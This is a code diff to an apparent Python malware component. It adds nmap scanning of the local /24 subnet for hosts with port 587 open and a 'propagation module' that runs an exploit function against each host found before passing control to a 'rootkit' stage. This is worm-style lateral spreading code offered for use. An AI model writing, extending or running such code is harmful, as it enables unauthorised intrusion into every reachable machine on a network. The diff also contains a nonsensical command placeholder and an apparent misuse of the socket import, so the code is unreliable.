@@ -17,7 +17,9 @@
 #!/usr/local/bin/python3
 
 from socket import *
+import nmap
 import sys
+import struct
 
 def exploit(ADDR, PORT, CMD):
     s = socket(AF_INET, SOCK_STREAM)
@@ -58,12 +60,42 @@ def exploit(ADDR, PORT, CMD):
     s.send(b'QUIT\r\n')
     s.recv(1024)
     print('[*] Done')
+    
+def get_network_range():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    packed_ip = socket.inet_aton(ip_address)
+    ip_as_integer = struct.unpack("!I", packed_ip)[0]
+    network_mask = 0b11111111111111111111111100000000
+    network_address = ip_as_integer & network_mask
+    packed_network_address = struct.pack("!I", network_address)
+    dotted_network_address = socket.inet_ntoa(packed_network_address)
+    network_range = dotted_network_address + '/24'
+    return network_range
+
+def scan_network_for_port(port):
+    nm = nmap.PortScanner()
+    network_range = get_network_range()
+    nm.scan(hosts=network_range, arguments=f'-p {port}')
+
+    hosts_list = []
+    for host in nm.all_hosts():
+        if nm[host].has_tcp(port) and nm[host]['tcp'][port]['state'] == 'open':
+            hosts_list.append(host)
+
+    return hosts_list
             
 def run():
     next_action = ""
     data = ""
     print("[+] Propagation module activated...")
-    
-    exploit()
+
+    cmd = "nano touch miau.txt"  # Replace with your command
+    port = 587
+    found_hosts = scan_network_for_port(port)
+
+    for host in found_hosts:
+        exploit(host, port, cmd)
+
     next_action = "rootkit"
     return data, next_action
